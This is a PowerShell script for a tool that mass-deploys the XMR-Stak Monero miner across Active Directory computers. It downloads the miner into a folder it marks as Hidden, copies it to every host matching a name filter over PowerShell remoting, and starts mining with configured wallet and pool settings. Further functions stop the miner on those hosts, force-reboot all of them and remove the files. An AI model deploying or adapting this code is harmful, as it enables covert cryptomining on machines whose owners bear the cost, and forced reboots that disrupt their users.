# Global Varibles
$searchBase = New-Object System.Collections.Generic.List[System.Object]
$stakVersion = "2.10.1"
$stakName = "xmr-stak-win64"
$distName = "vc_redist.x64.exe"

# Main Functions
function payload () {
	# Get xmr-stak from github.
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$stakName = $missionParameters.stakName
	$stakVersion = $missionParameters.stakVersion
	$cache = $missionParameters.cache
	$version = $stakVersion
	$name = $stakName + "-" + $version + ".zip"
	$link = "https://github.com/fireice-uk/xmr-stak/releases/download/"
	$payloadURI = "$link" + "$version" + "/" + "$name"
	$destination = $cache + "\" + "$name"
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-WebRequest -Uri $payloadURI -OutFile $destination
}

function redist () {
	# Get Visual C++ Redistributable
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$distName = $missionParameters.distName
	$cache = $missionParameters.cache
	$name = $distName
	$link = "https://aka.ms/vs/15/release/"
	$payloadURI = "$link" + "$name"
	$destination = $cache + "\" + "$name"
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-WebRequest -Uri $payloadURI -OutFile $destination
}

function configTpl () {
	# Get config template from github
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$cache = $missionParameters.cache
	$name = "config.tpl"
	$link = "https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/"
	$payloadURI = "$link" + "$name"
	$destination = $cache + "\" + "$name"
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-RestMethod -Uri $payloadURI -OutFile $destination
}

function poolTpl () {
	# Get pool template from github
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$cache = $missionParameters.cache
	$name = "pools.tpl"
	$link = "https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/"
	$payloadURI = "$link" + "$name"
	$destination = $cache + "\" + "$name"
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-RestMethod -Uri $payloadURI -OutFile $destination
}

function ammoDump ($outputPane,$progressBar) {
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$cache = $missionParameters.cache
	$stakName = $missionParameters.stakName
	$stakVersion = $missionParameters.stakVersion
	$distName = $missionParameters.distName
	$payloadName = $stakName + "-" + $stakVersion + ".zip"
	showAmmoDump $outputPane
	if (!(Test-Path $fireDirectionalControl)) { $outputPane.text += "`nWrite configuration parameters before proceeding!" } else {
		if (!(Test-Path $cache)) {
			$outputPane.text += "`nCreating cache..."
			mkdir $cache
			$f = Get-Item $cache -Force
			$f.Attributes = "Hidden"
			$outputPane.text += "`nDone!"
		} else { $outputPane.text += "`nDirectory present..." }
		if (!(Test-Path "$cache\config.tpl")) {
			$outputPane.text += "`nNo config, downloading..."
			configTpl
			$outputPane.text += "`nDone!"
		} else { $outputPane.text += "`nConfig is GO!" }
		if (!(Test-Path "$cache\pools.tpl")) {
			$outputPane.text += "`nNo pool, downloading..."
			poolTpl
			$outputPane.text += "`nDone!"
		} else { $outputPane.text += "`nPool is GO!" }
		if (!(Test-Path "$cache\$distName")) {
			$outputPane.text += "`nNo Microsoft Visual C++ ReDistributable, downloading..."
			redist
			$outputPane.text += "`nDone!"
		} else { $outputPane.text += "`nC++ is GO!" }
		if (!(Test-Path "$cache\$payloadName")) {
			$outputPane.text += "`nNo XMR-Stak, downloading..."
			payload
			$outputPane.text += "`nDone!"
		} else { $outputPane.text += "`nXMR-Stak is GO!" }
		$outputPane.text += "`nAmmo Dump Established!"
	}
}

function fireBase ($outputPane,$progressBar) {
	#check for $ops_cache directory and call ammoDump if it doesn't
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$opsDir = $missionParameters.ops
	$filterTarget = $missionParameters.target
	$advanceParty = $missionParameters.advanceParty
	$distName = $missionParameters.distName
	$stakName = $missionParameters.stakName
	$stakVersion = $missionParameters.stakVersion
	$searchbase = $missionParameters.search
	$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
	showFireBase $outputPane
	if (!(Test-Path $fireDirectionalControl)) { $outputPane.text += "`nWrite configuration parameters before proceeding!" } else {
		foreach ($client in $hostList.Name)
		{
			$counter++
			[int]$Percentage = ($counter / $hostList.count) * 100
			$ProgressBar.Value = $Percentage
			$outputPane.text += "Advance Party en-route to $client...`n"
			$baseSession = New-PSSession -ComputerName $client
			if (Invoke-Command -Session $baseSession -ScriptBlock { Test-Path -Path $args[0] } -ArgumentList $opsDir) {
				$outputPane.text += "Operations directory exists on $client`n"
				$folder = 1
			} else {
				$outputPane.text += "Operations directory does not exist on $client.  Initiating transfer....`n"
				$folder = 0
			}
			if ($folder -eq 0) { Copy-Item "${psscriptroot}\ops_cache" -Destination $opsDir -ToSession $baseSession -Recurse }
			$outputPane.text += "Complete!`n"
			$cmdstring = "invoke-command -computername $client -FilePath $advanceParty -ArgumentList $opsDir, $distName, $stakName, $stakVersion"
			$scriptblock = [scriptblock]::Create($cmdstring)
			Start-Process powershell -ArgumentList "-command $scriptblock" -RedirectStandardError stderr.txt -RedirectStandardOutput stdout.txt
		}
		$outputPane.text += "`n`nBASE ESTABLISHED!"
	}
}

function fireMission ($outputPane,$progressBar) {
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$searchbase = $missionParameters.search
	$filterTarget = $missionParameters.target
	$opsDir = $missionParameters.ops
	$stakName = $missionParameters.stakName
	$stakVersion = $missionParameters.stakVersion
	$cannonPath = $opsDir + "\" + $stakName + "-" + $stakVersion
	$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
	showFireMission $outputPane
	if (!(Test-Path $fireDirectionalControl)) { $outputPane.text += "`nWrite configuration parameters before proceeding!" } else {
		foreach ($client in $hostList.Name)
		{
			$counter++
			[int]$Percentage = ($counter / $hostList.count) * 100
			$ProgressBar.Value = $Percentage
			$outputPane.text += "$client - Firing...`n"
			$cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client ; & ‘$cannonPath\xmr-stak.exe’ -c '$cannonPath\config.txt' -C '$cannonPath\pools.txt' --cpu '$cannonPath\cpu.txt' --amd '$cannonPath\amd.txt' --nvidia '$cannonPath\nvidia.txt'}"
			$scriptBlock = [scriptblock]::Create($cmdstring)
			Start-Process powershell -ArgumentList "-command  $Scriptblock"
		}
		$outputPane.text += "`n`nFIRE FOR EFFECT!"
	}
}

function ceaseFire ($outputPane,$progressBar) {
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$searchbase = $missionParameters.search
	$filterTarget = $missionParameters.target
	$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
	showCeaseFire $outputPane
	if (!(Test-Path $fireDirectionalControl)) { $outputPane.text += "`nWrite configuration parameters before proceeding!" } else {
		foreach ($client in $hostList.Name)
		{
			$counter++
			[int]$Percentage = ($counter / $hostList.count) * 100
			$ProgressBar.Value = $Percentage
			$outputPane.text += "$client - Clearing Breach...`n"
			$cmdstring = "Invoke-Command -ComputerName $client -ErrorAction Continue -ScriptBlock { Stop-Process -Name xmr-stak }"
			$scriptblock = [scriptblock]::Create($cmdstring)
			Start-Process powershell -ArgumentList "-command  $Scriptblock"
		}
		$outputPane.text += "`n`nBREACHES CLEAR!"
	}
}

function cycleGunline ($outputPane,$progressBar) {
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$filterTarget = $missionParameters.target
	$searchbase = $missionParameters.search
	$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
	showCycleGunline $outputPane
	if (!(Test-Path $fireDirectionalControl)) { $outputPane.text += "`nWrite configuration parameters before proceeding!" } else {
		foreach ($client in $hostList.Name)
		{
			$counter++
			[int]$Percentage = ($counter / $hostList.count) * 100
			$ProgressBar.Value = $Percentage
			$outputPane.text += "Sending command to $client...`n"
			Invoke-Command $client -ErrorAction Continue -ScriptBlock { Restart-Computer -Force }
		}
		$outputPane.text += "`n`nGUNLINE CYCLED!"
	}
}

function getGrid ($outputPane) {
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$outputPane.text += "MISSION PARAMETERS:`n`n"
	$outputPane.text += "Organizational Unit(s): "
	$outputPane.text += $missionParameters.search.Name
	$outputPane.text += "`n`nSearch Base(s): "
	$outputPane.text += $missionParameters.search.distinguishedname
	$outputPane.text += "`n`nTarget Filter String: "
	$outputPane.text += $missionParameters.target
	$outputPane.text += "`n`nOperations Directory: "
	$outputPane.text += $missionParameters.ops
	$outputPane.text += "`n`nPayload: "
	$outputPane.text += $missionParameters.payload
	$outputPane.text += "`n`nAdvance Party: "
	$outputPane.text += $missionParameters.advanceParty
}

function setGrid ($outputPane,$textBox_filter,$textBox_OpsDir) {
	$filterTarget = $textBox_filter.text
	$opsDir = $textBox_OpsDir.text
	$walletAddress = $textBox_walletAddress.text
	$currencyType = $textBox_currencyType.text
	$poolAddress = $textBox_poolAddress.text
	$poolPort = $textBox_poolPort.text
	$configPath = "${psscriptroot}\fireDirectionalControl.json"
	$advanceParty = "${psscriptroot}\advanceParty.ps1"
	$cache = "${psscriptroot}\ops_cache"
	$storedSettings = @{
		stakName = $stakName
		stakVersion = $stakVersion
		distName = $distName
		search = $searchBase
		target = $filterTarget
		cache = $cache
		ops = $opsDir
		payload = $opsDir
		advanceParty = $advanceParty
		walletAddress = $walletAddress
		currencyType = $currencyType
		poolAddress = $poolAddress
		poolPort = $poolPort
	}
	$storedSettings | ConvertTo-Json | Out-File $configPath
	showRedLeg $outputPane
	$outputPane.text += "`n`nGrid Coordinates Set!"
	Start-Sleep -s 3
	showRedLeg $outputpane
	reconGrid $outputpane
}

function pushGrid ($outputPane,$textBox_OU) {
	[string]$searchString = $textBox_OU.text
	$selection = Get-ADObject -Filter "Name -eq '$searchString'" | Where-Object { $_.objectclass -eq 'organizationalunit' } | Select-Object Name,DistinguishedName
	if (!($searchBase -match $selection)) { $searchBase.Add($selection) }
	showGridCheck $outputpane
	$outputPane.text += "Current Search Base Values:`n"
	$outputPane.text += $searchBase | Format-Table | Out-String
}

function popGrid ($outputPane,$textBox_OU) {
	$searchBase.RemoveAt($searchBase.count - 1)
	showGridCheck $outputpane
	$outputPane.text += "Current Search Base Values:`n"
	$outputPane.text += $searchBase | Format-Table | Out-String
}

function clearGrid ($outputPane) {
	$searchBase.Clear()
	showRedLeg $outputpane
	$outputPane.text += "`nSearchBase is CLEAR!"
	Start-Sleep -s 3
	showRedLeg $outputpane
	reconGrid $outputpane
}

function moveOut ($outputPane,$progressBar) {
	$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
	$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
	$searchbase = $missionParameters.search
	$filterTarget = $missionParameters.target
	$opsDir = $missionParameters.ops
	$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
	showMoveOut $outputPane
	if (!(Test-Path $fireDirectionalControl)) { $outputPane.text += "`nWrite configuration parameters before proceeding!" } else {
		foreach ($client in $hostList.Name)
		{
			$counter++
			[int]$Percentage = ($counter / $hostList.count) * 100
			$ProgressBar.Value = $Percentage
			$outputPane.text += "$client - Moving Out...`n"
			$cmdstring = “invoke-command -computername $client -scriptblock { If(test-path $opsDir) { Remove-Item -path $opsDir -Recurse -Force }}”
			$scriptblock = [scriptblock]::Create($cmdstring)
			Start-Process powershell -ArgumentList "-command $Scriptblock"
		}
		$outputPane.text += "`n`nGUNLINE OUT!"
	}
}

function preflightCheck ($outputPane) {
	function versionCheck ($outputPane) {
		$currentVersion = $PSVersionTable.PSVersion
		if ($currentVersion -lt 5.1)
		{
			$outputPane.text += "Current Powershell Version is: $currentVersion`n"
			$outputPane.text += "Powershell Version is NO-GO AT THIS TIME!`n Please install Powershell 5.1 or greater`n"
		}
		else
		{
			$outputPane.text += "Current Powershell Version is: $currentVersion`n"
			$outputPane.text += "Powershell Version is GO AT THIS TIME!`n`n"
		}
	}
	function jsonCheck ($outputPane) {
		if (Test-Path "${psscriptroot}\fireDirectionalControl.json")
		{
			$outputPane.text += "Config File Present`n`n"
		}
		else
		{
			$outputPane.text += "Config File Needed`n`n"
		}
	}
	versionCheck $outputPane
	jsonCheck $outputPane
}

function reconGrid ($outputPane) {
	$outputPane.text += "CURRENT RECON:`n"
	$outputPane.text += Get-ADObject -Filter 'ObjectClass -eq "organizationalunit"' | Format-Table | Out-String
}

function readConfig ($outputPane) {
	showGridCheck $outputPane
	reconGrid $outputPane
	getGrid $outputPane
}